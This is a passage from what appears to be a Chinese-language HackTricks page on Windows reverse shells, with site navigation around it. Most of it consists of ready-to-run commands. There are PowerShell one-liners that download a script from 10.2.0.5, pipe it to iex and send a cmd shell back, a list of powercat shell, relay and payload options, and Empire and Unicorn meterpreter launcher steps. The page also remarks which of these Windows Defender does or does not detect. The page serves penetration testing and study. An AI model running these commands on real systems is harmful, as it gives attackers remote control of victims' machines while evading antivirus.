+<p><a href="https://github.com/besimorhino/powercat"><strong>https://github.com/besimorhino/powercat</strong></a></p>
+<p>下载，启动一个 web 服务器，启动监听器，并在受害者端执行它：</p>
+<pre><code>powershell -exec bypass -c "iwr('http://10.2.0.5/powercat.ps1')|iex;powercat -c 10.2.0.5 -p 4444 -e cmd"
+</code></pre>
+<p>Defender 目前尚未将其检测为恶意代码（截至2019年3月4日）。</p>
+<p><strong>powercat 提供的其他选项：</strong></p>
+<p>绑定 shell，反向 shell（TCP，UDP，DNS），端口重定向，上传/下载，生成有效负载，提供文件...</p>
+<pre><code>Serve a cmd Shell:
+powercat -l -p 443 -e cmd
+Send a cmd Shell:
+powercat -c 10.1.1.1 -p 443 -e cmd
+Send a powershell:
+powercat -c 10.1.1.1 -p 443 -ep
+Send a powershell UDP:
+powercat -c 10.1.1.1 -p 443 -ep -u
+TCP Listener to TCP Client Relay:
+powercat -l -p 8000 -r tcp:10.1.1.16:443
+Generate a reverse tcp payload which connects back to 10.1.1.15 port 443:
+powercat -c 10.1.1.15 -p 443 -e cmd -g
+Start A Persistent Server That Serves a File:
+powercat -l -p 443 -i C:\inputfile -rep
+</code></pre>
+<h3 id="empire"><a class="header" href="#empire">Empire</a></h3>
+<p><a href="https://github.com/EmpireProject/Empire">https://github.com/EmpireProject/Empire</a></p>
+<p>创建一个 powershell 启动器，将其保存在文件中并下载和执行。</p>
+<pre><code>powershell -exec bypass -c "iwr('http://10.2.0.5/launcher.ps1')|iex;powercat -c 10.2.0.5 -p 4444 -e cmd"
+</code></pre>
+<p><strong>被检测为恶意代码</strong></p>
+<h3 id="msf-unicorn"><a class="header" href="#msf-unicorn">MSF-Unicorn</a></h3>
+<p><a href="https://github.com/trustedsec/unicorn">https://github.com/trustedsec/unicorn</a></p>
+<p>使用unicorn创建metasploit后门的powershell版本</p>
+<pre><code>python unicorn.py windows/meterpreter/reverse_https 10.2.0.5 443
+</code></pre>
+<p>使用创建的资源启动 msfconsole：</p>
+<pre><code>msfconsole -r unicorn.rc
+</code></pre>
+<p>启动一个网络服务器，提供 <em>powershell_attack.txt</em> 文件，并在受害者上执行：</p>
+<pre><code>powershell -exec bypass -c "iwr('http://10.2.0.5/powershell_attack.txt')|iex"
+</code></pre>
+<p><strong>检测为恶意代码</strong></p>
+<h2 id="更多"><a class="header" href="#更多">更多</a></h2>
+<p><a href="https://github.com/jaredhaight/PSAttack">PS&gt;Attack</a> PS 控制台，预加载了一些攻击性 PS 模块（加密）<br />
+<a href="https://gist.github.com/NickTyrer/92344766f1d4d48b15687e5e4bf6f93c">https://gist.github.com/NickTyrer/92344766f1d4d48b15687e5e4bf6f9</a><a href="https://github.com/SecureThisShit/WinPwn"><br />
+WinPWN</a> PS 控制台，带有一些攻击性 PS 模块和代理检测（IEX）</p>
+<h2 id="参考"><a class="header" href="#参考">参考</a></h2>
+<ul>
+<li><a href="https://highon.coffee/blog/reverse-shell-cheat-sheet/">https://highon.coffee/blog/reverse-shell-cheat-sheet/</a></li>
+<li><a href="https://gist.github.com/Arno0x">https://gist.github.com/Arno0x</a></li>
+<li><a href="https://github.com/GreatSCT/GreatSCT">https://github.com/GreatSCT/GreatSCT</a></li>
+<li><a href="https://www.hackingarticles.in/get-reverse-shell-via-windows-one-liner/">https://www.hackingarticles.in/get-reverse-shell-via-windows-one-liner/</a></li>
+<li><a href="https://www.hackingarticles.in/koadic-com-command-control-framework/">https://www.hackingarticles.in/koadic-com-command-control-framework/</a></li>
+<li><a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md">https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md</a></li>
+<li><a href="https://arno0x0x.wordpress.com/2017/11/20/windows-oneliners-to-download-remote-payload-and-execute-arbitrary-code/">https://arno0x0x.wordpress.com/2017/11/20/windows-oneliners-to-download-remote-payload-and-execute-arbitrary-code/</a></li>
+</ul>
+<p>{% hint style="success" %}
+学习与实践 AWS 黑客技术：<img src="/.gitbook/assets/arte.png" alt="" data-size="line"><a href="https://training.hacktricks.xyz/courses/arte"><strong>HackTricks 培训 AWS 红队专家 (ARTE)</strong></a><img src="/.gitbook/assets/arte.png" alt="" data-size="line"><br />
+学习与实践 GCP 黑客技术：<img src="/.gitbook/assets/grte.png" alt="" data-size="line"><a href="https://training.hacktricks.xyz/courses/grte"><strong>HackTricks 培训 GCP 红队专家 (GRTE)</strong><img src="/.gitbook/assets/grte.png" alt="" data-size="line"></a></p>
+<details>
+<summary>支持 HackTricks</summary>
+<ul>
+<li>查看 <a href="https://github.com/sponsors/carlospolop"><strong>订阅计划</strong></a>!</li>
+<li><strong>加入</strong> 💬 <a href="https://discord.gg/hRep4RUj7f"><strong>Discord 群组</strong></a> 或 <a href="https://t.me/peass"><strong>电报群组</strong></a> 或 <strong>在</strong> <strong>Twitter</strong> 🐦 <strong>上关注我们</strong> <a href="https://twitter.com/hacktricks_live"><strong>@hacktricks_live</strong></a><strong>.</strong></li>
+<li><strong>通过向</strong> <a href="https://github.com/carlospolop/hacktricks"><strong>HackTricks</strong></a> 和 <a href="https://github.com/carlospolop/hacktricks-cloud"><strong>HackTricks Cloud</strong></a> github 仓库提交 PR 分享黑客技巧。</li>
+</ul>
+</details>
+{% endhint %}
+
+                    </main>
+
+                    <nav class="nav-wrapper" aria-label="Page navigation">
+                        <!-- Mobile navigation buttons -->
+                            <a rel="prev" href="../../generic-hacking/reverse-shells/msfvenom.html" class="mobile-nav-chapters previous" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts="Left">
+                                <i class="fa fa-angle-left"></i>
+                            </a>
+
+                            <a rel="next prefetch" href="../../generic-hacking/reverse-shells/linux.html" class="mobile-nav-chapters next" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts="Right">
+                                <i class="fa fa-angle-right"></i>
+                            </a>
+
+                        <div style="clear: both"></div>
+                    </nav>
+                </div>
+            </div>
+
+            <nav class="nav-wide-wrapper" aria-label="Page navigation">
+                    <a rel="prev" href="../../generic-hacking/reverse-shells/msfvenom.html" class="nav-chapters previous" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts="Left">
+                        <i class="fa fa-angle-left"></i>
+                    </a>
+
+                    <a rel="next prefetch" href="../../generic-hacking/reverse-shells/linux.html" class="nav-chapters next" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts="Right">
+                        <i class="fa fa-angle-right"></i>
+                    </a>
+            </nav>
+
+        </div>
+
+
+
+
+        <script>
+            window.playground_copyable = true;
+        </script>
+
+
+        <script src="../../elasticlunr.min.js"></script>
+        <script src="../../mark.min.js"></script>
+        <script src="../../searcher.js"></script>
+
+        <script src="../../clipboard.min.js"></script>
+        <script src="../../highlight.js"></script>
+        <script src="../../book.js"></script>
+
+        <!-- Custom JS scripts -->
+
+
+    </div>
+    </body>
+</html>
